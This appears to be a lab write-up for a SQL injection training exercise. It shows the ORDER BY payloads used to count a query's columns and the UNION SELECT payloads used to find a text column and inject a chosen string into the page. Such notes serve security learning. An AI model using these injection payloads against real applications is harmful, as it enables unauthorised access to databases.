Goal: identify a column that is compatible with string data in order to inject a string value on to the page

Analysis:
--------

(1) Find the number of columns that the vulnerable app is using:
' order by 1-- --> not displayed on page
' order by 2-- --> column is displayed on the page
' order by 3-- --> column is displayed on the page
' order by 4-- --> Internal Server Error

The app is using 3 columns

(2) Find which columns contain text. Once we figure this out we can use that column to inject the desired string.
Since we know the app is using 3 columns we can infer from the page that the second column contains text due to it being the column containing names of products

' UNION SELECT NULL,'a',NULL--  --> outputs 'a' in the product names field

(3) We can now use this to inject the string into the page 

' UNION SELECT NULL,'hp7U1A',NULL--
